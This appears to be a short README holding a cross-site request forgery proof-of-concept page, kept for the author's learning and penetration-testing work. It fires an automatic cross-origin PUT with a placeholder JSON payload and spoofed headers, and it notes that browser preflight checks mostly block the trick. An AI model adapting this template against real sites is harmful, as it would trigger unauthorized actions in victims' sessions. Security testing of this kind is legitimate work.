# XHR CSRF PoC

This is just some sample code for when creating an XHR CSRF PoC.    
It is used for my self learning purposes and work sometimes.


<details>
  <summary>csrf.html</summary>
  
```

<script>
	function getMe()

	{
		var http;
		http = new XMLHttpRequest();
		var url = "http://example.com";
		http.open("PUT", url, false);
		//http.setRequestHeader('Access-Control-Request-Meethod','POST');
		//http.setRequestHeader('Access-Control-Request-Meethod','content-type');
		http.setRequestHeader('Content-Type','application/json');
		http.setRequestHeader('Referer',url);
		http.setRequestHeader('Content-Length','33');
		http.setRequestHeader('Origin','http://example.com');
		http.onreadystatechange = function()
		{
			if(http.readyState == 2)
				{var response = http.responseText;
					document.getElementById('result').innerHTML = response;
				}
		}
http.send(`
	Your payload here
  `);
	}

	getMe();
</script>

<html>
<div id='result'></div>
</html>
```

</details>

Sadly modern browsers nowadays will send an OPTIONS request first to check for XHR, and it is not possible to modify the Origin in the request - it will be set to null.

Ref: https://stackoverflow.com/questions/21783079/ajax-in-chrome-sending-options-instead-of-get-post-put-delete
